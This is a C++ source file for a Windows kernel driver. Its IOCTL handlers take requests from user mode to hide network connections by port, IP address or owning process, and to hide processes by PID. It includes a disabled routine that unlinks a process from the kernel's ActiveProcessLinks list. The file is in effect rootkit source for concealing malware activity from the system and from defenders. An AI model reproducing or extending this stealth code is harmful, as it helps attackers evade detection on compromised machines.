#include "IoctlHandlers.h"
#include "NetworkHook.h"
#include "HideProcess.h"
#include <Ntstrsafe.h>

NTSTATUS IoctlHandlers::HandleTestConnection(_In_ PIRP Irp, _In_ const size_t BufferSize) 
{

	NTSTATUS status{STATUS_SUCCESS};

	char* inputBuf = static_cast<char*>(Irp->AssociatedIrp.SystemBuffer);
	char* outputBuf = static_cast<char*>(Irp->AssociatedIrp.SystemBuffer);

	KdPrint(("TEST_CONNECTION: got input:[%s]\n", inputBuf));

	char* outputPrefix = "recieved input-";

	//return "STATUS_BUFFER_TOO_SMALL" if return buffer length is too small
	if (BufferSize < (strlen(inputBuf) + strlen(outputPrefix) + 1)) {

		KdPrint(("TEST_CONNECTION: Ouyput buffer too small.\n"));
		status = STATUS_BUFFER_TOO_SMALL;
		Irp->IoStatus.Information = 0;

	}

	else 
	{
		//init a buffer from paged pool
		char* readBuf = reinterpret_cast<char*>(ExAllocatePool2(POOL_FLAG_PAGED, 1024, TAG_NET));
		if (readBuf == nullptr)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			Irp->IoStatus.Status = status;
			Irp->IoStatus.Information = 0;
			return status;
		}

		RtlZeroMemory(readBuf, 1024);

		//set the buffer to prefix ("hello from kernel mode...") + user input
		RtlStringCbCatA(readBuf, BufferSize, outputPrefix);
		RtlStringCbCatA(readBuf, BufferSize - strlen(outputPrefix) - 1, outputBuf);

		//copy the memory to the output buffer
		RtlCopyMemory(outputBuf, readBuf, strlen(readBuf) + 1);

		//free the paged pool buffer
		ExFreePoolWithTag(readBuf, TAG_NET);

		KdPrint(("TEST_CONNECTION: Sending to usermode %s\n", outputBuf));
		status = STATUS_SUCCESS;
		Irp->IoStatus.Information = strlen(outputBuf) + 1;
	}

	Irp->IoStatus.Status = status;
	return status;
}

static NTSTATUS NetRetrieveIntegerFromIrp(
	_In_ PIRP Irp, _Out_ ULONG& ret)
{
	PCSZ inputBuf = (PCSZ)(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	ANSI_STRING pidAnsiString{};
	UNICODE_STRING pidUnicodeString{};
	RtlInitAnsiString(&pidAnsiString, inputBuf);
	RtlAnsiStringToUnicodeString(&pidUnicodeString, &pidAnsiString, TRUE);

	KdPrint(("Input Value(Unicode String): %wZ\n", &pidUnicodeString));

	ULONG value{ 0 };
	NTSTATUS status = RtlUnicodeStringToInteger(&pidUnicodeString, 10, &value);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Failed to convert [%wZ] to Integer Value: Status[0x%X]\n", &pidUnicodeString, status));
		return STATUS_INVALID_PARAMETER;
	}

	if (value == 0)
	{
		KdPrint(("Failed to convert Port to Integer Value\n"));
		return STATUS_INVALID_PARAMETER;
	}

	ret = value;
	return STATUS_SUCCESS;
}

NTSTATUS  IoctlHandlers::HandleHidePort(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength == 0)
	{
		KdPrint(("Invalid Length:%zu\n", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint(("Input Buffer Length:%zu\n", InputBufferLength));
	KdPrint(("InputPort:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));

	ULONG port{ 0 };
	NTSTATUS status{ NetRetrieveIntegerFromIrp(Irp, port) };
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
		return status;
	}

	KdPrint(("HidePort: Recieved Port:%lu \n", port));

	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
	hiddenConnection.Port = (USHORT)port;
	NetHook::NetAddHiddenConnection(&hiddenConnection);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}

NTSTATUS  IoctlHandlers::HandleHideIP(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength != sizeof(NetHook::NETHOOK_HIDDEN_CONNECTION))
	{
		KdPrint(("Invalid Length! %zu", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	NetHook::PNETHOOK_HIDDEN_CONNECTION inputBuf = static_cast<NetHook::PNETHOOK_HIDDEN_CONNECTION>(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	NetHook::NetAddHiddenConnection(inputBuf);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}

NTSTATUS IoctlHandlers::HandleHideRemoteIP(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength != sizeof(NetHook::NETHOOK_HIDDEN_CONNECTION))
	{
		KdPrint(("Invalid Length! %zu", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	NetHook::PNETHOOK_HIDDEN_CONNECTION inputBuf = static_cast<NetHook::PNETHOOK_HIDDEN_CONNECTION>(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	NetHook::NetAddHiddenConnection(inputBuf);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}

NTSTATUS  IoctlHandlers::HandleHideConnectPID(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength == 0)
	{
		KdPrint(("Invalid Length:%zu\n", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint(("Input Buffer Length:%zu\n", InputBufferLength));
	KdPrint(("Input PID:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));

	ULONG pid{ 0 };
	NTSTATUS status{ NetRetrieveIntegerFromIrp(Irp, pid) };
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
		return status;
	}

	KdPrint(("HideConnectProc: Recieved process id: %d \n", pid));

	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
	hiddenConnection.ConnectPID = pid;
	NetHook::NetAddHiddenConnection(&hiddenConnection);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}

#if 0
static NTSTATUS UnlinkActiveProcessLinks(ULONG pid)
{

	PEPROCESS EProc{};
	PLIST_ENTRY PrevListEntry{nullptr}, NextListEntry{nullptr}, CurrListEntry{nullptr};

	//get EPROCESS structure
	NTSTATUS status{ PsLookupProcessByProcessId((HANDLE)pid, &EProc) };
	if (!NT_SUCCESS(status))
	{
		KdPrint(("HIDE_PROC: Failed to locate process by pid. code: (0x%08X)\n", status));
		return status;
	}
	KdPrint(("HIDE_PROC: EPROCESS struct addr: 0x%08p\n", EProc));
	PULONG procPtr = reinterpret_cast<PULONG>(EProc);

	PEPROCESS currProcess = PsGetCurrentProcess();
	PULONG currProcPtr = reinterpret_cast<PULONG>(currProcess);
	HANDLE currProcID = PsGetCurrentProcessId();
	KdPrint(("HIDE_PROC: Current EPROCESS struct addr:0x%08p CurrentPID:%p\n", currProcPtr, currProcID));

	//scan the structure for the PID field.
	for (ULONG i = 0; i < 0x2bc; i++)
	{
		if (procPtr[i] == pid)
		{
			//calculate ActiveProcessLinks (located near PID)
			CurrListEntry = reinterpret_cast<PLIST_ENTRY>(&procPtr[i + 1]);
			PrevListEntry = reinterpret_cast<PLIST_ENTRY>(&procPtr[i]);
			NextListEntry = reinterpret_cast<PLIST_ENTRY>(&procPtr[i]);
			KdPrint(("HIDE_PROC: LIST_ENTRY struct at: 0x%08p\n", CurrListEntry));
			break;
		}
	}

	if (!CurrListEntry)
	{
		return STATUS_UNSUCCESSFUL;
	}

	KdPrint(("HIDE_PROC: LIST_ENTRY[CurrentListEntry]:0x%08p  LIST_ENTRY[PrevListEntry]:0x%08p  LIST_ENTRY[NextListEntry]:0x%08p\n",
		CurrListEntry, PrevListEntry, NextListEntry));

	// unlink target process from processes near in linked list
	PrevListEntry->Flink = NextListEntry;
	NextListEntry->Blink = PrevListEntry;

	// Point Flink and Blink to self

	CurrListEntry->Flink = CurrListEntry;
	CurrListEntry->Blink = CurrListEntry;

	//decrease reference count of EPROCESS object
	ObDereferenceObject(EProc);

	return STATUS_SUCCESS;
	
}
#endif

NTSTATUS  IoctlHandlers::HandleHidePID(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength == 0)
	{
		KdPrint(("Invalid Length:%zu\n", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint(("Input Buffer Length:%zu\n", InputBufferLength));
	KdPrint(("Input PID:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));

	ULONG pid{ 0 };
	NTSTATUS status{ NetRetrieveIntegerFromIrp(Irp, pid) };
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
		return status;
	}

	KdPrint(("HideProc: Recieved process id: %d \n", pid));

	//manipulate ActiveProcessLinks to hide process
	// status = UnlinkActiveProcessLinks(pid);
	status = HideProcess::HideProcessByProcessID(pid);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}